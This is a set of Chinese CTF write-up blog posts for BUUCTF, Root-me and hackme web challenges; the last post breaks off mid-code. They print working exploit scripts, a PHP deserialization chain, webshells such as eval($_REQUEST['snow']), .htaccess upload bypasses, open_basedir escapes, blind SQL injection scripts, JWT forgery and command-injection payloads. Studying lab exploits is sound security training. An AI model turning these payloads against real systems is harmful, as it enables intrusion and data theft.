[{"title":"BUUCTF_WEB(二)","url":"/2020/09/14/buuctf1/","content":"\n\n[强网杯 2019]Upload\n\n<!-- more -->\n\n# [强网杯 2019]Upload\n\n题目流程走了一圈，没发现有什么利用点。查看cookie，发现存在base64编码的反序列化信息，所以猜测有源码泄露，扫目录发现题目存在源码泄露`www.tar.gz`\n，下载源码之后审计源码，既然题目是`Upload`，应该和上传有关，查看上传部分代码\n```php\npublic function upload_img(){\n    if($this->checker){\n        if(!$this->checker->login_check()){\n            $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\";\n            $this->redirect($curr_url,302);\n            exit();\n        }\n    }\n\n    if(!empty($_FILES)){\n        $this->filename_tmp=$_FILES['upload_file']['tmp_name'];\n        $this->filename=md5($_FILES['upload_file']['name']).\".png\";\n        $this->ext_check();\n    }\n    if($this->ext) {\n        if(getimagesize($this->filename_tmp)) {\n            @copy($this->filename_tmp, $this->filename);\n            @unlink($this->filename_tmp);\n            $this->img=\"../upload/$this->upload_menu/$this->filename\";\n            $this->update_img();\n        }else{\n            $this->error('Forbidden type!', url('../index'));\n        }\n    }else{\n        $this->error('Unknow file type!', url('../index'));\n    }\n}\n```\n可以看到上传之后题目都被强制修改后缀为`png`，无法执行PHP代码，所以要寻找其它漏洞点，结合前面的cookie，查找反序列化相关代码，发现在上传图片后会进行序列化操作\n```php\npublic function update_cookie(){\n        $this->checker->profile['img']=$this->img;\n        cookie(\"user\",base64_encode(serialize($this->checker->profile)),3600);\n    }\n```\n在首页存在反序列化操作\n```php\npublic function login_check(){\n    $profile=cookie('user');\n    if(!empty($profile)){\n        $this->profile=unserialize(base64_decode($profile));\n        $this->profile_db=db('user')->where(\"ID\",intval($this->profile['ID']))->find();\n        if(array_diff($this->profile_db,$this->profile)==null){\n            return 1;\n        }else{\n            return 0;\n        }\n    }\n}\n```\n接下来尝试构造pop链\n在`Profile`类中，存在两个魔术方法\n```php\npublic function __get($name)\n{\n    return $this->except[$name];\n}\n\npublic function __call($name, $arguments)\n{\n    if($this->{$name}){\n        $this->{$this->{$name}}($arguments);\n    }\n}\n```\n`__call`的触发需要调用不存在的方法，而在`Register`类的析构函数中\n```php\npublic function __destruct()\n{\n    if(!$this->registed){\n        $this->checker->index();\n    }\n}\n```\n此处调用了不存在的index方法，可以触发`__call`方法，然后`__call`方法又可以触发`__get`方法，这样，通过`__get`方法可以执行我们想要执行的函数，而在`Profile`类的`upload_img`函数正好存在利用点\n```php\npublic function upload_img(){\n    ...\n    if($this->ext) {\n        if(getimagesize($this->filename_tmp)) {\n            @copy($this->filename_tmp, $this->filename);\n            @unlink($this->filename_tmp);\n            $this->img=\"../upload/$this->upload_menu/$this->filename\";\n            $this->update_img();\n        }else{\n            $this->error('Forbidden type!', url('../index'));\n        }\n    }else{\n        $this->error('Unknow file type!', url('../index'));\n    }\n    ...\n}\n```\n我们可以通过控制`$ext=1`是代码进入此流程，先上传恶意图片，然后利用`@copy($this->filename_tmp, $this->filename);`来修改我们上传的文件后缀名从而getshell\n**攻击流程：**\n先上传恶意图片文件，内容为\n```\nGIF89a\n<?php @eval($_REQUEST['snow']); ?>\n```\n查看网页源代码获取到该图片的存储位置，序列化代码如下\n```php\nnamespace app\\web\\controller;\nclass Profile\n{\n    public $checker;\n    public $filename_tmp;\n    public $filename;\n    public $upload_menu;\n    public $ext;\n    public $img;\n    public $except;\n    function __construct()\n    {\n        $this->except = array('index'=>'upload_img');\n        $this->ext = 1;\n        $this->filename_tmp = './upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png';\n        $this->filename = './upload/snow.php';\n    }\n}\nclass Register\n{\n    public $checker;\n    public $registed;\n    function __construct($a){\n        $this->checker = $a;\n        $this->registed = 0;\n    }\n}\n$a = new Profile();\n$b = new Register($a);\n//echo serialize($b);\necho base64_encode(serialize($b));\n```\n替换cookie后刷新页面，访问上传的图片地址即可getshell\n\n# [SUCTF 2019]Pythonginx\n\n本题给出了源代码，是一个flask项目，会返回我们提交的url中的内容\n```python\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl, timeout=2).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n提示我们需要读文件，先是限制了host不能是suctf.cc（如果是函数就返回了），但是后面又显示必须是suctf.cc，关键点就在`urlsplit`函数，在[blackhat2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)会议上提到了此漏洞，通过inda编码的字符在进行unicode解码时会导致字符逃逸，例如`℀`会变成`a/c`，显然，这样会导致路径插入，比如`suctf.c℀om`可以变成`suctf.ca/com`，从而实现逃逸\n回到本题，我们可以直接找一个能解码成`c`的特殊字符即可\n![](buuctf1/1.png)\npayload如下:\n```\nfile://suctf.cⅭ/../../../../usr/local/nginx/conf/nginx.conf\nfile://suctf.cⅭ/../../../../usr/fffffflag\n```\n\n# [SUCTF 2019]EasyWeb\n\n题目给出了源代码\n```php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n    if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n$hhh = @$_GET['_'];\nif (!$hhh){\n    highlight_file(__FILE__);\n}\nif(strlen($hhh)>18){\n    die('One inch long, one inch strong!');\n}\nif ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) )\n    die('Try something else!');\n$character_type = count_chars($hhh, 3);\nif(strlen($character_type)>12) die(\"Almost there!\");\neval($hhh);\n?>\n```\n题目过滤了大量字符，经测试还有`^`可以用，参考p牛的方法使用异或进行代码执行，因为存在长度限制，所以使用字符数比较短的GET变量\n**小知识点： 在PHP中，url 参数默认是字符串类型**\nfuzz脚本：\n```php\n$s = '_GET';\nprint('%'.dechex(244).' ');\nfor($j=0;$j<strlen($s);$j++){\n    for($i=0;$i<255;$i++){\n        $a = chr(244)^chr($i);\n        if($a == $s[$j]){\n            echo '%'.dechex($i);\n            break;\n        }\n    }    \n}\n```\npayload：\n```\n${%ab%b3%b1%a0^%f4%f4%f4%f4}{%f4}();&%f4=phpinfo\n```\n由于长度受限，我们只能执行简单的函数，想要进行读文件等操作还是需要getshell，题目还给出了`get_the_flag`函数，其中存在上传功能，可以利用此函数进行文件上传，该函数存在过滤点\n1. 后缀检测\n2. 文件内容检测，文件中不得出现`<?`\n3. exif_imagetype\n\n可以通过文件上传加`.htaccess`进行绕过，代码没有表单，可以找个上传点抓包然后和本题数据包拼接一下就可以上传了，绕过2处的过滤，需要对PHP文件进行编码\n![](buuctf1/2.png)\n**PS:**因为是base64编码，所以要保证字符长度是4的倍数，如果不够的话要自己凑一下 \n![](buuctf1/3.png)\n然后访问a.ooo即可解析为PHP代码\n当然，也可以使用脚本上传\n```python\nimport requests\n\nurl = r\"http://84ae465d-bec5-48bb-965b-bd7f4b51394f.node3.buuoj.cn/?_=${%ab%b3%b1%a0^%f4%f4%f4%f4}{%f4}();&%f4=get_the_flag\"\nfile1 = {'file': ('a.ooo', 'GIF89aaa\\nPD9waHAgQGV2YWwoJF9SRVFVRVNUWyJzbm93Il0pO3BocGluZm8oKTs/Pg==')}\nfile2 = {'file': ('.htaccess', '#define width 45\\n#define height 45\\nAddType application/x-httpd-php .ooo\\nphp_value '\n    'auto_append_file \"php://filter/convert.base64-decode/resource=a.ooo\"')}\nr = requests.post(url, files=file1).text\nprint(r)\nr = requests.post(url, files=file2).text\nprint(r)\n```\n![](buuctf1/4.png)\n访问网站flag文件存在提示信息\n> hhhh\nThis is fake flag\nBut I heard php7.2-fpm has been initialized in unix socket mode!\n~    \n\n需要我们绕过open_basedir限制，我们可以选择绕过该限制，也可以选择直接绕过disable_functions（推荐这种方法，蚁剑有插件）\n\npayload\n```\nupload/tmp_bad194011f5ad0cf609c77ad222e50d6/a.ooo?snow=chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(file_get_contents(%27/THis_Is_tHe_F14g%27));\n```\n\n# [SUCTF 2019]Upload Labs 2\n\nphp://filter/resource=phar://./upload/bad194011f5ad0cf609c77ad222e50d6/b5e9b4f86ce43ca65bd79c894c4a924c.gif\n\n# [De1CTF 2019]SSRF Me\n\n题目给出源码和提示`flag is in ./flag.txt`\n\n```python\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\nsecert_key = os.urandom(16)\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0')\n```\n题目很明显是在考察哈希长度扩展攻击，但是在读文件的时候过滤了gopher和file协议，不过找到一篇[文章(http://13.58.107.157/archives/8936)](http://13.58.107.157/archives/8936)说可以使用`local_file`协议，该协议是linux下支持的一个协议，也可以实现读文件\n![](buuctf1/5.png)\n流程如下：\n先访问geneSign页面生成签名，这里要把我们的参数设定好，由于提示已经给出了flag位置，所以通过`local_file:flag.txt`即可读到flag\n在生成签名之后，用hashpump生成即可\n![](buuctf1/6.png)\n> PS: `input sig` 填写我们获得的签名，`input data`填写之前生成签名的明文**最后**几位字符，`input key len`填写明文总长度减去input data长度后的值，最后填写我们要添加的值。\n\n将结果中的`\\x`替换为`%`后按照要求提交即可，exp如下(cookie要在headers中提交，否则会报错)：\n```python\nimport requests\nfrom urllib import parse\nimport json\n\nurl = 'http://e78b915e-84fa-4293-a7eb-51e747ff6e43.node3.buuoj.cn/'\nsig = requests.get(url+'geneSign?param=local_file:flag.txt').content.decode('utf-8')\nprint(sig)\n\n# 用hashpump生成替换值\n\nheaders = {\n    \"Cookie\": \n    r\"action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read; sign=a21ff75fdafd472a4e5abda397747fa0\"\n}\n\nflag = requests.get(url+'De1ta?param=local_file:flag.txt',headers=headers).content.decode('utf-8')\nprint(json.loads(flag)['data'])\n```\n\n# [De1CTF 2019]Giftbox\n\n这题出的挺不错的，虽然整体考点并不难，但是却很考验综合能力，题目给出了源码（看了大佬wp才知道，原题是没有给源码的）\n首先得说师傅这前端做的真是漂亮，佩服。题目给了一个模拟shell，可以执行简单的命令，简单`usage.md`可以看到一些主要命令，但是需要登录\n![](buuctf1/7.png)\n登录界面进行测试发现存在注入，没有任何过滤，不过由于输入空格会被当做命令分隔符，所以需要用注释符来绕过空格，查看浏览记录发现每次请求时需要输入totp值，查看js代码发现这是Google的一个一次性身份验证算法，查看`main.js`有一段注释信息，基本给出了totp算法的各项参数\n```javascript\n/*\n[Developer Notes]\nOTP Library for Python located in js/pyotp.zip\nServer Params:\ndigits = 8\ninterval = 5\nwindow = 1\n*/\n```\npython下正好就有相应库，那么编写盲注脚本：\n```python\nimport requests\nimport pyotp\nfrom urllib import parse\n\nsec = 'GAXG24JTMZXGKZBU'\ntotp = pyotp.TOTP(sec, digits=8, interval=5)\nurl = 'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'\npassword = ''\npayload_pre = \"?totp={}&a=\"\n\nfor i in range(1, 60):\n    for j in range(34, 127):\n        tmp = parse.quote(\"login ad'/**/or/**/ascii(substr((select/**/password/**/from/**/users/**/where/**/username='admin'),{},1))={}# pa\".format(len(password)+1, j))\n        res = requests.get(url+payload_pre.format(totp.now()) + tmp).content.decode('utf-8')\n        if 'password incorrect' in res:\n            password += chr(j)\n            print(password)\n            break\n        if j == 127:\n            print('finished.')\n            exit()\n```\n得到密码`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`，密码中给出了命令提示`sh0w_hiiintttt_23333`，尝试运行一下\n```\n[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333\nwe add an evil monster named 'eval' when launching missiles.\n```\n那么基本就是命令执行了，登录之后，执行`targeting`命令设定参数，存在过滤\n```php\nfunction checkCode($code){\n    $table='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    if (strlen($code)>2){\n        return 'code too long.';\n    }\n    for ($i=0; $i<strlen($code); $i++) {\n        if (strpos($table,$code[$i])===FALSE){\n            return 'bad code.';\n        }\n    }\n    if (file_exists($sandbox.'missiles/'.md5($_SERVER['REMOTE_ADDR']).'/'.$code)){\n        return 'target existed.';\n    }\n    return NULL;\n}\nfunction checkPosition($position){\n    $table='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789})$({_+-,.';\n    if (strlen($position)>12){\n        return 'position too long.';\n    }\n    for ($i=0; $i<strlen($position); $i++) {\n        if (strpos($table,$position[$i])===FALSE){\n            return 'bad position.';\n        }\n    }\n    return NULL;\n}\n```\n在设定参数之后，如`targeting a b`，后台会把我们的处理为`$a=\"b\"`，然后带入eval中执行，由于使用了双引号包裹变量导致了漏洞，因为在PHP中，双引号包裹的变量会被PHP尝试解析[https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing](https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing)，利用此特性我们就可以进行函数执行，尝试执行phpinfo()，`targeting a ${phpinfo()}`，将返回页面保存到本地打开可以看到函数执行信息\n![](buuctf1/8.png)\n![](buuctf1/9.png)\n可以看到题目设置了basedir，需要进行绕过，payload如下：\n```python\nimport requests\nfrom urllib import parse\nimport pyotp\nimport re\n\nsec = 'GAXG24JTMZXGKZBU'\ntotp = pyotp.TOTP(sec, digits=8, interval=5)\nsession = requests.session()\nbase_url = 'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'\n\ndef login(sig):\n    url = base_url + '?a={}&totp={}'\n    payload = parse.quote('login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}')\n    con = session.get(url.format(payload, sig)).text\n    print(con)\n\ndef destruct(sig):\n    url = base_url + '?a={}&totp={}'\n    payload = 'destruct'\n    con = session.get(url.format(payload, sig)).text\n    print(con)\n\ndef targeting(sig, payload):\n    url = base_url + '?a={}&totp={}'\n    con = session.get(url.format(parse.quote(payload), sig)).text\n    print(con)\n\ndef launch(sig):\n    url = base_url + '?a={}&totp={}'\n    payload = 'launch'\n    con = session.get(url.format(payload, sig)).text\n    flag =  re.findall(r'(flag\\{[a-z0-9\\-]+\\})',con)\n    if flag:\n        print(flag[0])\n    else:\n        print(con)\nlogin(totp.now())\ndestruct(totp.now())\n\n# phpinfo()\n# payloads = ['targeting a ${phpinfo()}']\n\n# scandir('/')\n# payloads = ['targeting a chdir','targeting b img','targeting c {$a($b)}','targeting d ini_set','targeting e open_basedir',\n#    'targeting f ..','targeting g {$d($e,$f)}','targeting h {$a($f)}','targeting i {$a($f)}','targeting j chr',\n#    'targeting k {$j(47)}','targeting l {$d($e,$k)}','targeting m scandir','targeting n print_r','targeting o {$n($m($k))}']\n\n# file_get_contents('/flag')\npayloads = ['targeting a chdir','targeting b img','targeting c {$a($b)}','targeting d ini_set','targeting e open_basedir',\n    'targeting f ..','targeting g {$d($e,$f)}','targeting h {$a($f)}','targeting i {$a($f)}','targeting j chr',\n    'targeting k {$j(47)}','targeting l {$d($e,$k)}','targeting m flag','targeting n $k$m','targeting o file_get_',\n    'targeting p contents','targeting q $o$p','targeting r {$q($n)}']\n\nfor each in payloads:\n    targeting(totp.now(), each)\nlaunch(totp.now())\n```","tags":["CTF","Web"],"categories":["复现"]},{"title":"Rootme网站做题记录(三)","url":"/2020/09/13/rootme2/","content":"历史文章补发，接上篇\n<!-- more -->\n# Json Web Token (JWT) - Introduction\n\nJWT的相关题目，jWT全称json web token是一种进行无状态的身份验证方式，能够防止csrf等漏洞，但是该方法某些情况下也存在漏洞，本题是最简单的一种\n\n在生成jwt的过程中会由用户指定算法，而服务器端是允许用户指定算法为none，此时则不需要秘钥，生成的签名为空，这样的话任何token都能够验证通过，本题要求用admin用户登录，而当我们用guest身份登录时，可以看到服务器返回了jwt，在线解密\n\n![](rootme2/1.png)\n\n可以看到username为guest，我们只要修改为admin即可，代码如下\n\n```python\n# pip install PyJWT\nimport jwt\n\npayload = {\n    \"username\": \"admin\"\n}\ntoken = jwt.encode(payload, None, algorithm=\"none\")\nprint(token)\n```\n\n修改token后刷新即可得到flag\n\n![](rootme2/2.png)\n\n# Json Web Token-Public Key\n\n```python\nimport jwt\nimport base64\n\n\n# pub_key = open('public.pem','r').read()\n# print(pub_key)\npub_key = [\"-----BEGIN PUBLIC KEY-----\", \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAobJohW01foenuWj8ZWvN\", \"jHIU4UjntP01W06Nl8eHkYoSoWzEkEtx9h/BOG2JhlT9FWzTTDEm9Uz1FzD8AuxD\", \"VWySlP0x5+QTDZMhNKoSirUPRMOW4ioIW10HhrYmdsBvqmSDl7YpyTBMmRx8YCnk\", \"bHW+KHhSARrTsSTXM+W4/ly6/v4qJ6qHAiInPawLtlxINHTjgqqvKt6AbYzn/ghW\", \"6Mv1FNuGW1O/tNqjcss44uhBECoHfWs0m/6Y0V6JXBKhdEYkAlphCoKLE+fwW/ii\", \"NHtvZK200UT8dkF95NQ3f9h0pXgoE4cb0jaQeNG6raF18h5+vE/+4vfIfR/jzqMt\", \"pQIDAQAB\", \"-----END PUBLIC KEY-----\"]\npub_key = \"\".join(pub_key)\nprint(len(pub_key))\n# 442\n# pub_key = base64.b64decode(pub_key)\n\nprint(len(pub_key))\ntoken = jwt.encode({\"username\":\"admin\"}, key=pub_key, algorithm='HS256')\nprint token\n\n\n# for i in range(len(pub_key)):\n\t# pub_key[i] = pub_key[i]+'\\n'\n# print(pub_key)\n# f  = open('public.pem','w')\n# f.writelines(pub_key)\n# f.close()\n```\n\n# Json Web Token-Weak secret\n\n这种攻击方式原理很简单，就是弱密码，直接爆破加密秘钥，我用的是hashcat，命令如下\n\n```\nhashcat -m 16500 --force token.txt rockyou.txt\n```\n\n`token.txt`通过访问token页面获得，`rockyou.txt`是密码字典\n\n![](rootme2/9.png)\n\n秘钥为`lol`，就下来直接编写脚本获取flag：\n\n```python\nimport jwt\nimport requests\n\nsecret = \"lol\"\npayload = {\n        \"role\": \"admin\"\n    }\nurl = 'http://challenge01.root-me.org/web-serveur/ch59/admin'\nheaders = {\n        \"Authorization\": \"Bearer {}\"\n    }\ntoken = jwt.encode(payload, secret, algorithm=\"HS512\").decode()\nheaders['Authorization'] = \"Bearer \" + token\nres = requests.post(url,headers=headers).content\nprint(res)\n```\n\n# Insecure Code Management\n\n浏览题目参考文章，发现是git的使用文档，想到可能是考察git泄露，用GitHack恢复一下\n\n```\npython GitHack.py http://challenge01.root-me.org/web-serveur/ch61/.git/\n```\n\nconfig.php页面中存在密码哈希，在线解密一下即可\n\n![](rootme2/3.png)\n\n# Non-alphanumeric PHP code\n\n本题给出了源代码，核心代码如下\n\n```php\nif (isset($_POST['input'])) {\n    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){\n        print '<fieldset><legend>Result</legend>';\n        eval('print '.$_POST['input'].\";\");\n        print '</fieldset>';\n    }\n```\n\n题目过滤了字母与反引号，要求我们实现无字母数字的shell，参考p神文章看我们可以利用异或方式来实现，通过代码自动生成payload，由于部分字符为不可见字符，所以用url编码表示，不过本题是POST请求，url编码没用，直接用原字符即可\n\n```php\n$word = 'assert';\n$payload = '$_=';\nfor($i=0;$i<strlen($word);$i++){\n\t$tmp = ord($word[$i]);\n\t$mid = $tmp ^ 0x5b;\n\tif($i==0)\n\t\t$payload = $payload.\"('\".urlencode(chr($mid)).\"'^'[')\";\n\telse\n\t\t$payload = $payload.\".('\".urlencode(chr($mid)).\"'^'[')\";\n}\n$payload = $payload.';';\n//$_='assert';\n\n$payload = $payload.\"\\$__='_'\";\n$word = 'GET';\nfor($i=0;$i<strlen($word);$i++){\n  $tmp = ord($word[$i]);\n  $mid = $tmp ^ 0x5b;\n  $payload = $payload.\".('\".urlencode(chr($mid)).\"'^'[')\";\n}\n//$__='_GET'\n$payload = $payload.';$___=$$__;$_($___[_]);';\n//assert($_GET[_]);\n\necho $payload;\n// echo urldecode($payload);\n```\n\n生成的payload(url编码)如下：\n\n```php\n$_=('%3A'^'[').('%28'^'[').('%28'^'[').('%3E'^'[').('%29'^'[').('%2F'^'[');$__='_'.('%1C'^'[').('%1E'^'[').('%0F'^'[');$___=$$__;$_($___[_]);\n```\n\n![](rootme2/4.png)\n\n# Local File Inclusion - Wrappers\n\n打开之后发现首页page字段存在文件包含，题目又有上传功能，只能上传jpg后缀的文件，而且文件会被重新随机以jpg为后缀命名，这里考虑利用phar来进行文件包含\n\n编写代码`<?php phpinfo();?>`，然后转为zip文件，修改后缀名为jpg，然后phar包含\n\nPS：由于请求字段有长度限制，所以此处我们文件名命名只能命名为单个字符\n\n![](rootme2/5.png)\n\n查看`disable_functions`选项\n\n![](rootme2/6.png)\n\n`scandir`和`file_get_contents`没有被禁用，我们可以配合使用来读取指定文件，上传文件`<?php @eval($_POST['snow']);?>`，然后列文件\n\n![](rootme2/7.png)\n\n读flag\n\n![](rootme2/8.png)\n\n# SQL injection - Insert\n\n本题是一个插入型二次注入，注册时用户名与密码字段中如果出现引号则会报错`char not authorised`，猜测应该是字符被过滤了，不过在email字段则没有报错，猜测应该是个引号型的二次注入，尝试引号闭合\n\n![](rootme2/10.png)\n\n登录可以发现确实成功闭合\n\n![](rootme2/11.png)\n\n猜测后端的语句应该是\n\n```php\n$sql =  \"insert into `table` values('\".$username.\"','\".$password.\"','\".$email.\"');\";\n```\n\n本来我打算通过异或注入来进行注入，但是异或之后老是无法得到正确的结果，所以放弃该思路，想到是否可以通过堆叠注入来一次注入多个数据，但是insert字段被过滤了，所以此路不通，搜索资料发现可以不通过insert而直接插入多组数据\n\n![](rootme2/12.png)\n\n![](rootme2/13.png)\n\n可以看到数据成功插入，只不过一次插入了两条数据，我们要用后面一条记录登录\n\n爆表\n\n![](rootme2/14.png)\n\n![](rootme2/15.png)\n\n爆列名\n\n![](rootme2/16.png)\n![](rootme2/17.png)\n\n爆数据\n\n![](rootme2/18.png)\n\n![](rootme2/19.png)\n\n# SQL injection - Filter bypass\n\n题目给出了提示，就是绕过过滤，简单测试之后发现`id`参数存在数字型注入，接下来测试过滤\n\n![](rootme2/20.png)\n\n可以看到许多关键词都被过滤了，测试发现部分关键词可以大写绕过，空格可以用`%a0`绕过，但是逗号也被过滤了，在联合注入时没有逗号的话无法分割字段，需要找一种方法在不使用逗号的情况下达到分割字段的目的，就是使用`john`关键字，测试如下\n\n有逗号联合查询\n\n![](rootme2/21.png)\n\n无逗号联合查询\n\n![](rootme2/22.png)\n\n`information_schema`关键词也被过滤而且大小写无法绕过，思索之际偶然发现网页源代码给出了建表语句\n\n```sql\nCREATE TABLE IF NOT EXISTS `membres` (\n   `id` int(1) NOT NULL AUTO_INCREMENT,\n   `username` VARCHAR(5) NOT NULL,\n   `pass` VARCHAR(20) NOT NULL,\n   `email` VARCHAR( 50 ) NOT NULL,\n   PRIMARY KEY (`id`)\n) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;\n```\n\n这样的话就不需要系统数据库了\n\npayload如下\n\n```sql\nid=0 Union sElect * fRom ((sElect 1)a JOIN (Select pass fRom membres liMit 1 Offset 0)b JOIN (Select 3)c JOIN (Select 4)d)\n```\n\n空格需要替换一下\n\n```php\n$sql = '0 Union sElect * fRom ((sElect 1)a JOIN (Select pass fRom membres liMit 1 Offset 0)b JOIN (Select 3)c JOIN (Select 4)d)';\necho str_replace(' ', \"%a0\", $sql);\n```\n\n最终payload\n\n```sql\n0%a0Union%a0sElect%a0*%a0fRom%a0((sElect%a01)a%a0JOIN%a0(Select%a0*%a0fRom%a0membres%a0liMit%a01%a0Offset%a00)b%a0JOIN%a0(Select%a03)c%a0JOIN%a0(Select%a04)d)\n```\n\n获取flag\n\n![](rootme2/23.png)\n\n","tags":["CTF"],"categories":["writeup"]},{"title":"hackme-web题解","url":"/2020/09/13/hackme-1/","content":"\n历史文章补发\n# 前言\n\n最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址[https://hackme.inndy.tw/](https://hackme.inndy.tw/)\n\n<!--more-->\n\n# LFI\n\n查看源代码\n\n![](hackme/1.png)\n\n尝试读取\n\n```\nhttps://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag\n```\n\n> Can you read the flag<?php require('config.php'); ?>?\n\n读取config即可得到flag\n\n```\nhttps://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config\n```\n\n# homepage\n\n查看代码在结尾看到一个`cute.js`，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可\n\n# ping\n\n命令执行，我们可以使用 `$()` 或者 <code>` `</code> 都可以实现执行命令的作用\n\n```bash\nhttps://hackme.inndy.tw/ping/?ip=$(ls -a)\n```\n\n然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试\n\n```bash\nhttps://hackme.inndy.tw/ping/?ip=$(tac *.*)\n```\n\n# scoreboard\n\nf12查看点击网络，查看一下消息头即可看到flag\n\n# login as admin 0\n\n题目主要源码如下\n\n```php\n<?php\nrequire('config.php');\n// table schema\n// user -> id, user, password, is_admin\nif($_GET['show_source'] === '1') {\n    highlight_file(__FILE__);\n    exit;\n}\nfunction safe_filter($str)\n{\n    $strl = strtolower($str);\n    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||\n        strstr($strl, 'update') || strstr($strl, 'delete')\n    ) {\n        return '';\n    }\n    return str_replace(\"'\", \"\\\\'\", $str);\n}\n$_POST = array_map(safe_filter, $_POST);\n$user = null;\n// connect to database\nif(!empty($_POST['name']) && !empty($_POST['password'])) {\n    $connection_string = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', DB_HOST, DB_NAME);\n    $db = new PDO($connection_string, DB_USER, DB_PASS);\n    $sql = sprintf(\"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'\",\n        $_POST['name'],\n        $_POST['password']\n    );\n    try {\n        $query = $db->query($sql);\n        if($query) {\n            $user = $query->fetchObject();\n        } else {\n            $user = false;\n        }\n    } catch(Exception $e) {\n        $user = false;\n    }\n}\n?>\n```\n\n本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下\n\n```php\nfunction 